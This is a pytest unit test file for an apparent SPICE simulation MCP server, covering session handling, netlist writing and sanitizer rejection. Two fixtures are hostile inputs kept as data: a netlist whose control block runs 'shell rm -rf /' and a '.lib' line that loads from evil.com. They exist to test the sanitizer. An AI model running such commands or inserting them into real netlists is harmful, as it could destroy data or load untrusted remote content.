"""Unit tests for Stage 4 tool handlers (no Docker required)."""

from __future__ import annotations

import pytest

import spicemcp._globals as _globals
from spicemcp.config import SpiceMCPConfig
from spicemcp.core.session_manager import SessionManager
from spicemcp.tools.netlist import write_netlist
from spicemcp.tools.session import cleanup_session, create_session, list_sessions
from spicemcp.tools.simulate import simulate

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture(autouse=True)
def fresh_globals():
    """Give every test its own SessionManager and reset globals afterward."""
    _globals.config = SpiceMCPConfig()
    _globals.manager = SessionManager(ttl_minutes=10, max_sessions=5, reaper_interval=9999)
    yield
    _globals.manager.stop()
    _globals.config = None
    _globals.manager = None


# ---------------------------------------------------------------------------
# create_session
# ---------------------------------------------------------------------------


def test_create_session_ltspice():
    r = create_session("ltspice")
    assert r["error"] is None
    assert r["status"] == "created"
    assert r["simulator"] == "ltspice"
    assert isinstance(r["session_id"], str) and len(r["session_id"]) == 12
    assert r["expires_in_minutes"] == 10


def test_create_session_ngspice():
    r = create_session("ngspice")
    assert r["error"] is None
    assert r["simulator"] == "ngspice"


def test_create_session_unknown_simulator():
    r = create_session("qspice")
    assert r["error"] is not None
    assert "qspice" in r["error"]
    assert r["session_id"] is None


def test_create_session_max_sessions_enforced():
    # Fill to max
    for _ in range(5):
        r = create_session("ltspice")
        assert r["error"] is None
    # 6th should fail
    r = create_session("ltspice")
    assert r["error"] is not None
    assert "Maximum" in r["error"]
    assert r["session_id"] is None


# ---------------------------------------------------------------------------
# list_sessions
# ---------------------------------------------------------------------------


def test_list_sessions_empty():
    r = list_sessions()
    assert r["sessions"] == []
    assert r["total_sessions"] == 0
    assert r["total_raw_mb"] == 0.0


def test_list_sessions_after_create():
    create_session("ltspice")
    create_session("ngspice")
    r = list_sessions()
    assert r["total_sessions"] == 2
    simulators = {s["simulator"] for s in r["sessions"]}
    assert simulators == {"ltspice", "ngspice"}


def test_list_sessions_fields():
    r_create = create_session("ltspice")
    sid = r_create["session_id"]
    r = list_sessions()
    assert len(r["sessions"]) == 1
    s = r["sessions"][0]
    assert s["session_id"] == sid
    assert s["status"] == "created"
    assert s["domain"] is None
    assert isinstance(s["expires_in_seconds"], int) and s["expires_in_seconds"] > 0
    assert s["has_raw_file"] is False
    assert s["has_meas_results"] is False
    assert s["simulation_required"] is False


# ---------------------------------------------------------------------------
# cleanup_session
# ---------------------------------------------------------------------------


def test_cleanup_session_not_found_is_idempotent():
    r = cleanup_session("nonexistent123")
    assert r["error"] is None
    assert r["session_status"] == "not_found"
    assert r["freed_mb"] == 0.0


def test_cleanup_session_cleans_raw_file(tmp_path):
    r_create = create_session("ltspice")
    sid = r_create["session_id"]
    session = _globals.manager.get_session(sid)

    # Manually plant a fake raw file
    raw = session.work_dir / "circuit.raw"
    raw.write_bytes(b"X" * 1024)
    session.raw_path = raw
    session.raw_file_size_mb = 1024 / (1024 * 1024)

    r = cleanup_session(sid, keep_log=True, delete_session=False)
    assert r["error"] is None
    assert r["session_status"] == "cleaned"
    assert not raw.exists()


def test_cleanup_session_delete():
    r_create = create_session("ltspice")
    sid = r_create["session_id"]

    r = cleanup_session(sid, delete_session=True)
    assert r["session_status"] == "deleted"
    # Session should be gone
    assert _globals.manager.get_session(sid) is None


# ---------------------------------------------------------------------------
# write_netlist
# ---------------------------------------------------------------------------

VALID_NETLIST = (
    "* RC filter\nV1 in 0 PULSE(0 5 0 10n 10n 500n 1u)\nR1 in out 1k\nC1 out 0 1n\n.tran 5u\n.end\n"
)

MALICIOUS_NETLIST = "* Malicious\n.control\nshell rm -rf /\n.endc\n.end\n"


def test_write_netlist_session_not_found():
    r = write_netlist("badid123456", VALID_NETLIST)
    assert r["error"] is not None
    assert "not found" in r["error"]
    assert r["accepted"] is False


def test_write_netlist_accepted():
    r_create = create_session("ltspice")
    sid = r_create["session_id"]

    r = write_netlist(sid, VALID_NETLIST)
    assert r["error"] is None
    assert r["accepted"] is True
    assert r["violations"] == []

    # Netlist file should exist in work_dir
    session = _globals.manager.get_session(sid)
    assert session.netlist_path is not None
    assert session.netlist_path.exists()
    assert session.simulation_required is True


def test_write_netlist_custom_filename():
    r_create = create_session("ngspice")
    sid = r_create["session_id"]

    r = write_netlist(sid, VALID_NETLIST, filename="filter.net")
    assert r["accepted"] is True
    assert r["filename"] == "filter.net"
    session = _globals.manager.get_session(sid)
    assert session.netlist_path.name == "filter.net"


def test_write_netlist_sanitizer_rejection():
    r_create = create_session("ngspice")
    sid = r_create["session_id"]

    r = write_netlist(sid, MALICIOUS_NETLIST)
    assert r["accepted"] is False
    assert r["error"] is None
    assert len(r["violations"]) >= 1
    assert r["violations"][0]["type"] == "CONTROL_BLOCK"


def test_write_netlist_violation_fields():
    r_create = create_session("ngspice")
    sid = r_create["session_id"]

    r = write_netlist(sid, MALICIOUS_NETLIST)
    v = r["violations"][0]
    assert "line" in v
    assert "type" in v
    assert "content" in v
    assert "fix" in v


def test_write_netlist_lib_url_rejected():
    r_create = create_session("ltspice")
    sid = r_create["session_id"]
    netlist = "* test\n.lib http://evil.com/bad.lib\n.end\n"
    r = write_netlist(sid, netlist)
    assert r["accepted"] is False
    assert any(v["type"] == "LIB_URL" for v in r["violations"])


def test_write_netlist_overwrites_previous():
    r_create = create_session("ltspice")
    sid = r_create["session_id"]

    write_netlist(sid, VALID_NETLIST, filename="v1.net")
    write_netlist(sid, VALID_NETLIST, filename="v2.net")

    session = _globals.manager.get_session(sid)
    assert session.netlist_path.name == "v2.net"


# ---------------------------------------------------------------------------
# simulate — error path only (no Docker)
# ---------------------------------------------------------------------------


def test_simulate_session_not_found():
    r = simulate("nonexistent000")
    assert r["error"] is not None
    assert "not found" in r["error"]
    assert r["status"] is None


def test_simulate_no_netlist():
    r_create = create_session("ltspice")
    sid = r_create["session_id"]
    # Session created but no netlist written
    r = simulate(sid)
    assert r["error"] is not None
    assert "no netlist" in r["error"].lower()
    assert r["status"] is None


def test_simulate_timeout_capped_at_600():
    """timeout_s > 600 should be silently capped - verified via simulate error path."""
    r_create = create_session("ltspice")
    sid = r_create["session_id"]
    # No netlist, so we get the 'no netlist' error before simulation runs.
    # This just confirms the function accepts large timeout_s without raising.
    r = simulate(sid, timeout_s=9999)
    assert r["error"] is not None  # 'no netlist' error, not a crash
